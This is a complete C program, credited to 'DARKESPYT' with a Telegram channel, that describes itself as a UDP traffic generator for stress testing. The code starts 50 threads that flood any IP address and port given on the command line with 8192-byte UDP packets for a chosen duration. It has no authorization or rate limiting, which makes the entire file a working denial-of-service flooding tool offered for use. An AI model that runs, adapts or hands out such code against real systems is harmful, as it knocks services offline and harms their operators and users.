/**
 * Powerful Traffic Generator
 * 
 * @description Generates UDP traffic for stress testing purposes.
 * @author DARKESPYT
 * @license This code is licensed under the MIT License.
 * 
 * Copyright (c) 2024 @DARKESPYT Telegram Channel
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation 
 * files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, 
 * modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the 
 * Software is furnished to do so, subject to the following conditions:
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE 
 * WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR 
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR 
 * OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define THREAD_COUNT 50
#define PACKET_SIZE 8192
#define MAX_RETRIES 5

typedef struct {
    char *ip;
    int port;
    int duration;
} thread_data_t;

void* send_powerful_traffic(void* arg) {
    thread_data_t *data = (thread_data_t *)arg;
    struct sockaddr_in server_addr;
    int sock;
    char *packet = malloc(PACKET_SIZE);
    time_t start_time = time(NULL);
    if (!packet) {
        perror("Memory allocation failed");
        pthread_exit(NULL);
    }
    memset(packet, rand() % 255, PACKET_SIZE);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    if (inet_pton(AF_INET, data->ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid IP address");
        free(packet);
        pthread_exit(NULL);
    }
    int retry_count = 0;
    do {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            retry_count++;
            usleep(100 * 1000);
        }
    } while (sock < 0 && retry_count < MAX_RETRIES);
    if (sock < 0) {
        perror("Socket creation failed after retries");
        free(packet);
        pthread_exit(NULL);
    }
    while (time(NULL) - start_time < data->duration) {
        ssize_t sent_bytes = sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            perror("Packet send failed");
            break;
        }
        printf("[DARKESPYT] Sent %zd bytes to %s:%d\n", sent_bytes, data->ip, data->port);
    }
    close(sock);
    free(packet);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <Port> <Duration in seconds>\n", argv[0]);
        return EXIT_FAILURE;
    }
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    pthread_t threads[THREAD_COUNT];
    thread_data_t thread_data = {ip, port, duration};
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, send_powerful_traffic, &thread_data) != 0) {
            perror("Thread creation failed");
            return EXIT_FAILURE;
        }
    }
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    printf("[DARKESPYT] Traffic generation completed.\n");
    return EXIT_SUCCESS;
}
